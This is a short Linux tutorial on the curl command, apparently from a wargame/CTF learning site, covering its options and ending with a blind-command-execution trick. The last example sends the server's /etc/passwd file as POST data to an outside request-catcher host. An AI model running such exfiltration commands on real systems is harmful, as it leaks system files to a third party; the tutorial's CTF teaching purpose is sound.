Short for client URL, data transfer command that sends data to or receives data from server. It is available in the form curl  OPTIONS URL and supports a variety of protocols, including HTTP, HTTPS, and FTP. Below is an example of receiving and printing the content of the web server.
```
user@user-VirtualBox:~$ curl https://www.google.com
<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="ko"> 
... (omitted)
user@user-VirtualBox:~$
```
The main options for the curl are 
- -o file: save the received data to a file
- -i: include HTTP response headers in the result value
- -X "method": specify the HTTP request method
- -d "key: value": send data with the HTTP POST method

Is also a useful for solving wargame challenges. For example, if one can execute any shell commands but cannot see the output result directly, the result can be included in curl command and can be sent to the one's web server. Below is an example of sending the /etc/passwd file on the server as POST data to webserver.
```
$ curl "https://hmqtzgx.request.dreamhack.games" -d "`cat /etc/passwd`"
```